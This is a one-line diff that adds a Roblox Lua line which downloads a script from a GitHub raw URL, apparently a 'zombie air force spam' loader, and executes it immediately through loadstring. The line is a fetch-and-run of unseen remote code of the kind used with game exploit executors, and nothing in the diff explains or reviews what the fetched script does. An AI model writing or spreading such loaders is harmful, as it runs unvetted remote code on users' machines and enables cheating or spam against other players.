@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/new-zombie-air-force-spam2-hmac65l4ifbhbn.lua"))()
